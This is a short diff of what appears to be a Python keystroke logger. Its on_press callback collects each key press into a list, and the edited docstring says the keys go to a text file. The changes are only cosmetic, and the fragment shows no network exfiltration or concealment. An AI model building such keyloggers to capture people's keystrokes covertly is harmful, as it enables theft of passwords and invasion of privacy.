@@ -4,11 +4,11 @@ import datetime
 import time
 
 unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
-
 count, keys = 0, []
 
+
 def on_press(key):
-    """Reset the `count` to zero, and transfer the data in `keys` while clearing the list."""
+    """Reset the `count` to zero, and transfer the data in `keys` to the designated text file while clearing the list."""
     global keys, count
     keys.append(key)
     count += 1
